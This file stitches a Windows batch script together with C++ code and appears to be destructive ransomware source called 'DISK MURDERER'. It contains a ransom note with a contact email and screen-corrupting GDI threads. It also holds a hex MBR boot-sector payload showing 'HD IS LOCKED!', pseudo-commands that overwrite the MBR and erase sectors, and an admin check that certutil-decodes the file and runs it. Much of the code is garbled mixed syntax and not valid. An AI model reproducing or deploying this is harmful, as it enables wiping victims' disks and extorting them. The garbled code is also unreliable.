@echo off
goto setup
:3
%EnityPoint% 2
title DISK MURDERER
set Note {

 Hello....
 ALL YOUR DATA IN HARD DISK IS MURDERED BY ME

 I destroyed your computer just now! You can't use PE to recover your data  because all your disk data has been overwritten!
 Try to restart or shut down will immediately destroy your data!

 Of course, don't worry. 
 You can safely recover all your data. 
 You need to pay me ransom. I will send you an unlock password. 
 Enter your password below to recover your data. If the password is correct, you can start recovery immediately!

 Ransom: 2$

 Email:ceeyourbac@126.com
 Enjoy the last time of you whit your computer!
 
 Creator: ceeyourbac

};
#pragma comment(lib,"Shlwapi.lib")
#pragma  comment(lib,"WinMM.lib")
using namespace std;
HCRYPTPROV prov;
int random() {
	if (prov == NULL)
		if (!CryptAcquireContext(&prov, NULL, NULL, PROV_RSA_FULL, CRYPT_SILENT | CRYPT_VERIFYCONTEXT))
			ExitProcess(1);

	int out;
	CryptGenRandom(prov, sizeof(out), (BYTE*)(&out));
	return out & 0x7fffffff;
}
POINT mkp(int x, int y) {
	POINT p;
	p.x = x;
	p.y = y;
	return p;
}
#define thread(name) DWORD WINAPI name(LPVOID lpParam)
#define rt(thrdname) CreateThread(NULL, 0, thrdname, NULL, 0, NULL);
DWORD WINAPI pat(LPVOID lpParameter) {
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
	HDC hdc = GetDC(NULL);
	for (;;) {
		SelectObject(hdc, CreateSolidBrush(RGB(rand() % 256, rand() % 256, rand() % 256)));
		PatBlt(hdc, 0, 0, w, h, PATINVERT);
		SelectObject(hdc, CreateSolidBrush(RGB(rand() % 256, rand() % 256, rand() % 256)));
		PatBlt(hdc, 50, 50, w - 100, h - 100, PATINVERT);
		SelectObject(hdc, CreateSolidBrush(RGB(rand() % 256, rand() % 256, rand() % 256)));
		PatBlt(hdc, 100, 100, w - 200, h - 200, PATINVERT);
		SelectObject(hdc, CreateSolidBrush(RGB(rand() % 256, rand() % 256, rand() % 256)));
		PatBlt(hdc, 150, 150, w - 300, h - 300, PATINVERT);
		SelectObject(hdc, CreateSolidBrush(RGB(rand() % 256, rand() % 256, rand() % 256)));
		PatBlt(hdc, 200, 200, w - 400, h - 400, PATINVERT);
		SelectObject(hdc, CreateSolidBrush(RGB(rand() % 256, rand() % 256, rand() % 256)));
		PatBlt(hdc, 250, 250, w - 500, h - 500, PATINVERT);
	}
	return 0;
}
DWORD WINAPI wave(LPVOID lpParameter) {
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
	HDC hdc = GetDC(NULL);
	HDC hcdc = CreateCompatibleDC(hdc);
	HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
	SelectObject(hcdc, hBitmap);
	for (;;) {
		StretchBlt(hcdc, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
		int r = h / 2;
		for (int i = 0; i <= r; i += 5) {
			int d = sqrt(float(2 * r * i - i * i));
			StretchBlt(hcdc, -d / 3, i, w, 5, hdc, 0, i, w, 5, SRCCOPY);
		}
		for (int i = 0; i <= r; i += 5) {
			int d = sqrt(float(2 * r * (r - i) - (r - i) * (r - i)));
			StretchBlt(hcdc, -d / 3, i + r, w, 5, hdc, 0, i + r, w, 5, SRCCOPY);
		}
		StretchBlt(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, SRCCOPY);
		Sleep(10);
	}
}
DWORD WINAPI _Ellipse(LPVOID lpParameter) {
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
	HDC hdc = GetDC(NULL);
	int i = 0;
	int n = 50;
	int x = random() % (w - 400);
	int y = random() % (h - 400);
	for (int cnt = 0; cnt < 50; cnt++) {
		if (n >= 450) {
			x = random() % (w - 400);
			y = random() % (h - 400);
			n = 50;
			i = 0;

		}
		HDC hcdc = CreateCompatibleDC(hdc);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
		SelectObject(hcdc, hBitmap);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, NOTSRCCOPY);
		HBRUSH hBrush = CreatePatternBrush(hBitmap);
		SelectObject(hdc, hBrush);
		for (; i <= n; i += 10) {
			Ellipse(hdc, x - i, y - i, x + i, y + i);
			Sleep(20);
		}
		DeleteObject(hBrush);
		DeleteObject(hBitmap);
		n += 50;
	}
	return 0;
}
DWORD WINAPI Stretch(LPVOID lpParameter) {
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
	HDC hdc = GetDC(NULL);
	for (int i = 0; i < 1200; i++) {
		int _w = random() % 100 + 400, _h = random() % 100 + 400;
		int x = random() % (w - _w), y = random() % (h - _h);
		StretchBlt(hdc, x + (5 - random() % 10), y + (5 - random() % 10), _w + (5 - random() % 10), _h + (5 - random() % 10), hdc, x, y, _w, _h, SRCCOPY);
		StretchBlt(hdc, x + (5 - random() % 10), y + (5 - random() % 10), _w + (5 - random() % 10), _h + (5 - random() % 10), hdc, x, y, _w, _h, SRCCOPY);
		StretchBlt(hdc, x + (5 - random() % 10), y + (5 - random() % 10), _w + (5 - random() % 10), _h + (5 - random() % 10), hdc, x, y, _w, _h, SRCCOPY);
	}
	return 0;
}
void _DrawError(bool x) {
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
	int icnsz = GetSystemMetrics(SM_CXICON);
	HDC hdc = GetDC(NULL);
	POINT p;
	if (x) {
		p = mkp(0, random() % h);
	}
	else {
		p = mkp(random() % w, 0);
	}
	for (;;) {
		if (p.x >= w || p.y >= h) {
			return;
		}
		DrawIcon(hdc, p.x, p.y, LoadIcon(NULL, IDI_ERROR));
		p.x += icnsz;
		p.y += icnsz;
		Sleep(50);
	}
	return;
}
DWORD WINAPI DrawError(LPVOID lpParameter) {
	for (int i = 0; i < 30; i++) {
		_DrawError(random() % 2);
	}
	return 0;
}
DWORD WINAPI CopyCur(LPVOID lpParameter) {
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
	HDC hdc = GetDC(NULL);
	for (;;) {
		CURSORINFO pci;
		pci.cbSize = sizeof(pci);
		GetCursorInfo(&pci);
		for (int i = 1; i <= 20; i++)
			DrawIcon(hdc, random() % w, random() % h, pci.hCursor);
		Sleep(500);
	}
	return 0;
}
DWORD WINAPI Tunnel(LPVOID lpParameter) {
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
	HDC hdc = GetDC(NULL);
	for (int i = 0; i < 100; i++) {
		POINT ps[3] = { mkp(0,h / 8), mkp(w - (w / 8),0), mkp(w / 8, h) };
		PlgBlt(hdc, ps, hdc, 0, 0, w, h, 0, 0, 0);
		Sleep(100);
	}
	return 0;
}
DWORD WINAPI MoveDesk(LPVOID lpParameter) {
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
	HDC hdc = GetDC(NULL);
	HDC hcdc = CreateCompatibleDC(hdc);
	HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
	SelectObject(hcdc, hBitmap);
	for (int i = 0; i <= 100; i++) {
		BitBlt(hcdc, 0, 0, w / 10, h, hdc, w / 10 * 9, 0, SRCCOPY);
		BitBlt(hcdc, w / 10, 0, w / 10 * 9, h, hdc, 0, 0, SRCCOPY);
		BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
	}
	return 0;
}
DWORD WINAPI Click(LPVOID lpParameter) {
	for (;;) {
		mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
		mouse_event(MOUSEEVENTF_RIGHTDOWN | MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
		Sleep(200);
		keybd_event(16, 0, 0, 0);
		Sleep(200);
		keybd_event(16, 0, KEYEVENTF_KEYUP, 0);
		Sleep(200);
		keybd_event(random() % 26 + 65, 0, 0, 0);
	}
	return 0;
}
DWORD WINAPI gray(LPVOID lpParameter) {
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
	HDC hdc = GetDC(NULL);
	HDC hcdc = CreateCompatibleDC(hdc);
	HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w / 2, h / 1);
	SelectObject(hcdc, hBitmap);
	for (;;) {
		StretchBlt(hcdc, 0, 0, w / 2, h / 1, hdc, 0, 0, w, h, SRCCOPY);
		for (int i = 0; i < w / 2; i++) {
			for (int j = 0; j < h / 1; j++) {
				int r = GetRValue(GetPixel(hcdc, i, j));
				int g = GetGValue(GetPixel(hcdc, i, j));
				int b = GetBValue(GetPixel(hcdc, i, j));
				SetPixel(hcdc, i, j, RGB((r + g + b) / 3, (r + g + b) / 3, (r + g + b) / 3));
			}
		}
		StretchBlt(hdc, 0, 0, w, h, hcdc, 0, 0, w / 2, h / 1, SRCCOPY);
		Sleep(250);
	}
	return 0;
}
DWORD WINAPI triangle(LPVOID lpParameter) {
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
	HDC hdc = GetDC(NULL);
	HDC hcdc = CreateCompatibleDC(hdc);
	HBITMAP hBitmap = CreateCompatibleBitmap(hdc, 50, 50);
	SelectObject(hcdc, hBitmap);
	//HDC hcdc2 = CreateCompatibleDC(hdc);
	//HBITMAP hBitmap2 = CreateCompatibleBitmap(hdc, w, h);
	//SelectObject(hcdc2, hBitmap2);
	for (int i = 0; i < 50; i++) {
		for (int j = 0; j < 50; j++) {
			SetPixel(hcdc, i, j, RGB(random() % 256, random() % 256, random() % 256));
		}
	}
	HBRUSH hBrush = CreatePatternBrush(hBitmap);
	SelectObject(/*hcdc2*/hdc, hBrush);
	int numx = w / 150;
	if (w % 150 != 0) {
		numx++;
	}
	int numy = h / 150;
	if (h % 150 != 0) {
		numy++;
	}
	WAVEFORMATEX fmt = { WAVE_FORMAT_PCM, 1, 44100, 44100, 1, 8, 0 };

	HWAVEOUT hwo;
	waveOutOpen(&hwo, WAVE_MAPPER, &fmt, NULL, NULL, CALLBACK_NULL);

	const int bufsize = 44100 * 10;
	char* wavedata = (char*)LocalAlloc(0, bufsize);

	WAVEHDR hdr = { wavedata, bufsize, 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hwo, &hdr, sizeof(hdr));
	for (;;) {
		for (int i = 0; i < bufsize; i++) {
			wavedata[i] = (unsigned char)((i % 257) / 2 + 100);
		}

		waveOutWrite(hwo, &hdr, sizeof(hdr));

		//BitBlt(hcdc2, 0, 0, w, h, hdc, 0, 0, SRCCOPY);

		for (int i = 0; i <= numx; i++) {
			for (int j = 0; j <= numy; j++) {
				POINT pt[] = { mkp(150 * i, 150 * j), mkp(150 * i + 150, 150 * j), mkp(150 * i, 150 * j + 150) };
				Polygon(/*hcdc2*/hdc, pt, 3);
			}
		}

		//BitBlt(hdc, 0, 0, w, h, hcdc2, 0, 0, SRCCOPY);
	}
	return 0;
}
LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == HCBT_CREATEWND) {
		CREATESTRUCT* pcs = ((CBT_CREATEWND*)lParam)->lpcs;
		int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
		if ((pcs->style & WS_DLGFRAME) || (pcs->style & WS_POPUP)) {
			HWND hwnd = (HWND)wParam;
			int x = random() % (w - pcs->cx);
			int y = random() % (h - pcs->cy);

			pcs->x = x;
			pcs->y = y;
		}
	}

	return CallNextHookEx(0, nCode, wParam, lParam);
}
DWORD WINAPI MessageThread(LPVOID parameter) {
	HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
	string Message;
	for (int i = 0; i < 20; i++) {
		Message[i] = (char)(33 + random() % 94);
	}
	MessageBox(NULL, Message.c_str(), Message.c_str(), MB_OK | MB_SYSTEMMODAL | MB_ICONHAND);
	UnhookWindowsHookEx(hook);

	return 0;
}
DWORD WINAPI MSGBX(LPVOID parameter) {
	for (;;) {
		CreateThread(NULL, 4096, &MessageThread, NULL, NULL, NULL);
		Sleep(2000);
	}
}
DWORD WINAPI Square(LPVOID parameter) {
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
	HDC hdc = GetDC(NULL);
	for (;;) {
		RECT rect;
		rect.bottom = random() % h + 1;
		rect.top = random() % rect.bottom;
		rect.right = random() % w + 1;
		rect.left = random() % rect.right;
		FillRect(hdc, &rect, CreateSolidBrush(RGB(rand() % 256, rand() % 256, rand() % 256)));
		Sleep(100);
	}
}
DWORD WINAPI _MSG(LPVOID parameter) {
	MessageBox(NULL, "", "TOO LATE", MB_OK | MB_SYSTEMMODAL | MB_ICONHAND);
	return 0;
}
set loadA=t
set loadB=se
set #include=%loadB%%loadA%
set SectorLock {
	8C C8 8E D8 8E C0 B8 00 06 BB 00 07 31 C9 BA FF FF CD 10 B8 01 13 BB 0C 00 B9 0D 00 BA 1F 0C BD 26 7C CD 10 EB FE 48 44 20 49 53 20 4C 4F 43 4B 45 44 21 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 56 31 CC 5C 00 00 00 00 01 01 05 FE 3F 03 C1 3E 00 00 43 BC 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 55 AA
}
#pragma comment(lib,"Shlwapi.lib")
#pragma  comment(lib,"WinMM.lib")
Write data RickAstley.png > Sector MBR
for SectorNum<2000 {
	Set int SertorNum=0
	RemoveSectorA.dll,RemoveSector SertorNum
	SectorNum = SectorNum + 1	
}
WriteDisk Create #SectorLock
color c0
echo #note
for DeathMessage<3{
	set /p Userinput=nul
	DeathMessage=DeathMessag+1
}
Start Point KeBugCheckWithTf,Display("c0114514")
:2
net.exe session 1>NUL 2>NUL && (
    goto as_admin
) || (
    goto not_admin
)
:as_admin
set v="%temp%\temp.exe"
del %v% >NUL 2>NUL
certutil -decode "%~f0" %v% >NUL 2>NUL
start "" %v%
goto 1
:not_admin
echo This program requires administrator permission!
pause
goto 1
:setup
set load=mp
set EnityPoint=goto
set NullPoint=to
set int=3
set DeathMessage=3
set pointa=o
set pointb=e
set pointc=te
%EnityPoint% 3
